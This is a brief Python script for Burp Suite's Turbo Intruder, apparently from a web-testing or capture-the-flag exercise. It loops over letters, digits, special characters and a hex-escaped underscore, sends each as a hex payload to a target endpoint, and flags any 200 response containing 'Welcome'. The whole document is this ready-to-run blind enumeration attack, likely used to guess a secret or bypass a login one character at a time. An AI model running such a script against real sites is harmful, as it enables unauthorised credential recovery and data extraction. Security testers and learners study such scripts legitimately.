#Payload Used in Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False
                           )
    #printable_ascii = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&\()*+,-./:;<=>?@[\\]^_`{|}~"
    candidate = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    underscore = "5c5f"
    special_char = "!#$&\()*+,-./:;<=>?@[\\]^`{|}~"
    for j in candidate:
        payload = hex(ord(j))[2:]
        engine.queue(target.req, payload)
    for j in special_char:
        payload = hex(ord(j))[2:]
        engine.queue(target.req, payload)
    payload = underscore
    engine.queue(target.req, payload)
def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status == 200 and 'Welcome' in req.response:
        table.add(req)
